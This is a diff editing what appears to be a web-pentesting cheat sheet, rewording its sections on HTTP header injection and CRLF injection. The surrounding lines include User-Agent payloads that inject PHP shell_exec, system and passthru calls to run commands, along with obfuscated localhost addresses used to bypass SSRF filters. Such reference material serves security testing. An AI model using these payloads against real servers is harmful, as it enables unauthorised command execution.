@@ -112,9 +112,10 @@ Changing Content-Type:
 * `Content-Type: image/png` =>  `Content-Type: text/html`
 
 **HTTP Header Injection**  
-NOTE: inject your payload into headers by replacing/concat header value  
 
-PHP code exec:  
+Inject your payload into headers by replacing/concat a header value.
+
+PHP code exec via. header injection:
 ```php
 /* User-Agent header injection */
 User-Agent: Mozilla <h1>hello world</h1>           // confirm
@@ -122,6 +123,9 @@ User-Agent: Mozilla <?php shell_exec('bin/ls');?>  // cmd injection #1
 User-Agent: Mozilla <?php system('bin/ls');?>      // cmd injection #2
 User-Agent: Mozilla <?php passthru('bin/ls');?>    // cmd injection #3 
 ```
+
+[Carriage-Return Line-Feed injection:](#clrf-injection-in-http-header)
+
 
 ### ============================================================
 ### Authentication and Session Management
@@ -661,7 +665,7 @@ http://0x7f.1/
 http://127.000.000.1
 ```
 
-CLRF injection in HTTP header:
+CLRF injection in HTTP header
 ```
 Carriage Return (\r) or Line Feed (\n) terminates a line of HTTP request.
 
